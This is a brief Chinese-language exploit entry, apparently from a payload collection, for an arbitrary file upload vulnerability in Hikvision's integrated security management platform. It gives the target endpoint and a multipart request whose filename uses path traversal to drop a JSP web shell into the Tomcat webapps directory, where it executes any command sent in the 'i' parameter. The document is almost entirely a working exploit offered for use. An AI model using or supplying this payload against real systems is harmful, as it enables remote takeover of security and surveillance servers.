# HiKVISION综合安防管理平台files任意文件上传漏洞

海康 ｜ 文件上传 ｜ —
- **请求**：`POST /svm/api/external/report HTTP/1.1`

**Payload**
```
------WebKitFormBoundary9PggsiM755PLa54a
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
Content-Type: application/zip
<%Runtime.getRuntime().exec(request.getParameter("i"));%>
------WebKitFormBoundary9PggsiM755PLa54a--
```
- **响应特征**：-1